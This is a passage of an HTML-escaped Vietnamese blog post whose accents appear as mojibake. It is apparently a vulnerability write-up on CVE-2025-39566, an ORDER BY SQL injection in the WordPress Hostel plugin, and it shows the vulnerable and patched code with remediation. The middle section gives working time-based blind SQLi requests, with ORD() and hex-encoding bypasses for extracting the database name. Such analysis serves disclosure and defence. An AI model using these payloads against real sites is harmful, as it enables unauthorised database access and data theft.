class=&#34;heading-element&#34; id=&#34;code-comparison&#34;&gt;&lt;span&gt;Code Comparison&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-comparison&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#x9;&#x9;&#x9;&#x9;&#x9;&#xA;    $orderby = &amp;#34;ORDER BY &amp;#34;.sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]) . &amp;#39; &amp;#39; . $dir;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#xA;    $ob = sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]);&#xA;    if(!in_array($ob, [&amp;#39;tB.id&amp;#39;, &amp;#39;tB.contact_name&amp;#39;, &amp;#39;tB.contact_email&amp;#39;, &amp;#39;tB.from_date&amp;#39;, &amp;#39;tB.amount_paid&amp;#39;, &amp;#39;tB.status&amp;#39;])) {&#xA;        $ob = &amp;#39;tB.id&amp;#39;;&#xA;    }&#xA;    $orderby = &amp;#34;ORDER BY $ob $dir&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ B·∫£n v√° s·ª≠ d·ª•ng &lt;strong&gt;whitelist&lt;/strong&gt; ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ &lt;code&gt;&#39;tB.id&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Analysis&lt;/strong&gt;: L·ªó h·ªïng xu·∫•t hi·ªán khi param &lt;code&gt;ob&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ &lt;code&gt;ORDER BY&lt;/code&gt; th√¥ng qua h√†m &lt;code&gt;sanitize_text_field()&lt;/code&gt;, ch·ªâ escape m√† kh√¥ng filter SQLi.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$bookings = $wpdb-&amp;gt;get_results(&amp;#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM &amp;#34;.WPHOSTEL_BOOKINGS.&amp;#34; tB JOIN &amp;#34;.WPHOSTEL_ROOMS.&amp;#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C·∫•u query n·∫±m trong nh√°nh &lt;code&gt;default&lt;/code&gt; c·ªßa c·∫•u tr√∫c &lt;code&gt;switch&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;To√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static &lt;code&gt;manage()&lt;/code&gt; c·ªßa class &lt;code&gt;WPHostelBookings&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class WPHostelBookings {&#xA;    static function manage() {&#xA;        global $wpdb;&#xA;        $_booking = new WPHostelBooking();&#xA;&#xA;        switch(@$_GET[&amp;#39;do&amp;#39;]) {&#xA;            case &amp;#39;add&amp;#39;: // add handle&#xA;            break;&#xA;&#xA;            case &amp;#39;edit&amp;#39;: // edit handle&#xA;            break;&#xA;&#xA;            // view/print booking details. Will allow also to confirm/cancel&#xA;            case &amp;#39;view&amp;#39;: // view handle&#x9;&#x9;&#x9;&#xA;            break;&#x9;&#x9;&#x9;&#xA;&#xA;            // list bookings&#xA;            default:&#xA;            // another logic&#xA;&#xA;            if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#x9;&#x9;&#x9;&#x9;&#x9;&#xA;                $orderby = &amp;#34;ORDER BY &amp;#34;.sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]) . &amp;#39; &amp;#39; . $dir;&#xA;            }&#xA;&#xA;            $bookings = $wpdb-&amp;gt;get_results(&amp;#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room &#xA;            FROM &amp;#34;.WPHOSTEL_BOOKINGS.&amp;#34; tB JOIN &amp;#34;.WPHOSTEL_ROOMS.&amp;#34; tR ON tR.id = tB.room_id&#xA;            WHERE is_static=0 $where_sql $orderby $limit_sql&amp;#34;);&#xA;&#xA;            // another logic&#xA;            break;&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua &lt;strong&gt;Plugin API (Hook System)&lt;/strong&gt;. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m &lt;code&gt;manage()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a &lt;code&gt;&amp;quot;manage&amp;quot;&lt;/code&gt; trong th∆∞ m·ª•c ch·ª©a plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/search_manage.png&#34;&#xA;    alt=&#34;search manage()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Trong file &lt;code&gt;models/hostel.php&lt;/code&gt; ta c√≥ h√†m:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class class WPHostel {&#xA;    // another logic&#xA;&#xA;    static function menu() {&#xA;        // we use &amp;#39;hostelpro_manage&amp;#39; for consistency with the pro version&#xA;        $wphostel_caps = current_user_can(&amp;#39;manage_options&amp;#39;) ? &amp;#39;manage_options&amp;#39; : &amp;#39;hostelpro_manage&amp;#39;;     &#xA;&#xA;        add_menu_page(__(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), __(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#34;wphostel_options&amp;#34;, &#xA;            array(__CLASS__, &amp;#34;options&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#39;Settings&amp;#39;, &amp;#39;wphostel&amp;#39;), __(&amp;#39;Settings&amp;#39;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#34;wphostel_options&amp;#34;, &#xA;            array(__CLASS__, &amp;#34;options&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Manage Rooms&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Manage Rooms&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_rooms&amp;#39;, array(&amp;#39;WPHostelRooms&amp;#39;, &amp;#34;manage&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_bookings&amp;#39;, array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;manage&amp;#34;)); &#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Unavailable Dates&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Unavailable Dates&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_unavailable&amp;#39;, array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;unavailable&amp;#34;)); &#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Email Log&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Email Log&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_emaillog&amp;#39;, array(&amp;#39;WPHostelHelp&amp;#39;, &amp;#34;email_log&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Help&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Help&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_help&amp;#39;, array(&amp;#39;WPHostelHelp&amp;#39;, &amp;#34;index&amp;#34;));     &#xA;    }&#xA;&#xA;    // another logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;·ªû ƒë√¢y:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;add_menu_page()&lt;/code&gt; t·∫°o &lt;strong&gt;menu ch√≠nh&lt;/strong&gt; trong Admin Dashboard.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;add_submenu_page()&lt;/code&gt; th√™m c√°c &lt;strong&gt;submenu&lt;/strong&gt; con cho menu ƒë√≥.&lt;/li&gt;&#xA;&lt;li&gt;Tham s·ªë &lt;code&gt;$callback&lt;/code&gt; l√† m·ªôt &lt;strong&gt;callback function&lt;/strong&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;V√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = &amp;#39;&amp;#39;, $icon_url = &amp;#39;&amp;#39;, $position = null);&#xA;add_menu_page(__(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), __(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#34;wphostel_options&amp;#34;, &#xA;    array(__CLASS__, &amp;#34;options&amp;#34;));&#xA;&#xA;// add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = &amp;#39;&amp;#39;);&#xA;add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_bookings&amp;#39;, array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;manage&amp;#34;));&#xA;&#xA;// array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;manage&amp;#34;)); =&amp;gt; WPHostelBookings::manage()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static &lt;code&gt;menu()&lt;/code&gt; c·ªßa class &lt;code&gt;WPHostel&lt;/code&gt;. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m &lt;code&gt;menu()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a &lt;code&gt;menu&lt;/code&gt; trong th∆∞ m·ª•c ch·ª©a plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/menu_ui.png&#34;&#xA;    alt=&#34;Menu UI&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Menu UI&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Ch·ª©c nƒÉng b·ªã l·ªói n·∫±m trong &lt;strong&gt;Booking Manager&lt;/strong&gt;, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu &lt;code&gt;Manager Bookings&lt;/code&gt; tr√™n UI Admin Dashboard.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Ngay tr∆∞·ªõc nh√°nh default c√≥ comment &lt;code&gt;// list bookings&lt;/code&gt; =&amp;gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác &lt;strong&gt;li·ªát k√™ v√† s·∫Øp x·∫øp bookings&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;M·ªü debugger:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Click &lt;kbd&gt;Run with Debugger&lt;/kbd&gt;.&lt;/li&gt;&#xA;&lt;li&gt;ƒê·∫∑t &lt;strong&gt;breakpoint&lt;/strong&gt; t·∫°i &lt;strong&gt;nh√°nh switch ch·ª©a code l·ªói&lt;/strong&gt; v√† &lt;strong&gt;t·∫°i d√≤ng code g√¢y l·ªói&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Debugger nh·∫£y v√†o c·∫•u tr√∫c &lt;code&gt;switch&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;D√πng &lt;strong&gt;Step Over&lt;/strong&gt;, debugger ƒëi ti·∫øp v√†o nh√°nh &lt;code&gt;default&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ti·∫øp t·ª•c &lt;strong&gt;Step Over&lt;/strong&gt; v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab &lt;code&gt;Variables &amp;gt; Locals&lt;/code&gt;. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room &#xA;FROM wp_hostel_bookings tB &#xA;JOIN wp_hostel_rooms tR ON tR.id = tB.room_id &#xA;WHERE is_static=0 AND tB.id = ... &#xA;ORDER BY tB.amount_paid ASC|DESC &#xA;LIMIT ...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê√°ng ch√∫ √Ω, bi·∫øn &lt;code&gt;$orderby&lt;/code&gt; ƒë∆∞·ª£c g√°n nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#x9;&#x9;&#x9;&#x9;&#x9;&#xA;    $orderby = &amp;#34;ORDER BY &amp;#34;.sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]) . &amp;#39; &amp;#39; . $dir;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ph·∫ßn sau &lt;code&gt;ORDER BY&lt;/code&gt; s·ª≠ d·ª•ng &lt;code&gt;sanitize_text_field()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;H√†m n√†y ch·ªâ &lt;strong&gt;lo·∫°i b·ªè/escape HTML&lt;/strong&gt;, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong &lt;strong&gt;SQL context&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Tham s·ªë &lt;code&gt;ob&lt;/code&gt; (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ &lt;strong&gt;ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Request with BurpSuite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=upcoming&amp;amp;ob=tB.status,(SELECT&amp;#43;SLEEP(10))&amp;amp;dir=ASC HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta t√°ch m·ªánh ƒë·ªÅ &lt;code&gt;ORDER BY&lt;/code&gt; b·∫±ng &lt;code&gt;,&lt;/code&gt; v√¨ n√≥ ch·∫•p nh·∫≠p &lt;strong&gt;multi column&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/time_response.png&#34;&#xA;    alt=&#34;time response&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Time response&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;K·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =&amp;gt; SQL Injection th√†nh c√¥ng.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;dump-data-from-database&#34;&gt;&lt;span&gt;Dump Data from Database&lt;/span&gt;&#xA;  &lt;a href=&#34;#dump-data-from-database&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bypass &lt;code&gt;&#39;&lt;/code&gt; using ORD()&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa &lt;strong&gt;database name&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Do &lt;code&gt;sanitize_text_field()&lt;/code&gt; lo·∫°i b·ªè &lt;code&gt;&#39;&lt;/code&gt;, ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng &lt;code&gt;ORD()&lt;/code&gt; ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=past&amp;amp;ob=tB.status,(SELECT&amp;#43;IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))&amp;amp;dir=ASC HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Th√†nh c√¥ng bypass =&amp;gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/ord_bypass.png&#34;&#xA;    alt=&#34;ORD bypass&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;ORD bypass&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Bypass &lt;code&gt;&#39;&lt;/code&gt; using Hex encoding (extend)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ngo√†i &lt;code&gt;ORD()&lt;/code&gt; ta c√≥ th·ªÉ s·ª≠ d·ª•ng &lt;strong&gt;Hex encoding&lt;/strong&gt; ƒë·ªÉ bypass&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=past&amp;amp;ob=tB.status,(SELECT&amp;#43;IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))&amp;amp;dir=ASC HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Th√†nh c√¥ng bypass =&amp;gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/ord_bypass.png&#34;&#xA;    alt=&#34;Hex encoding bypass&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Hex encoding bypass&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;remediation&#34;&gt;&lt;span&gt;Remediation&lt;/span&gt;&#xA;  &lt;a href=&#34;#remediation&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;C·∫≠p nh·∫≠t l√™n &lt;strong&gt;Hostel Plugin v1.1.5.7&lt;/strong&gt; ho·∫∑c m·ªõi h∆°n&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;takeaways&#34;&gt;&lt;span&gt;Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt; ‚â† ch·ªëng &lt;strong&gt;SQL Injection&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener 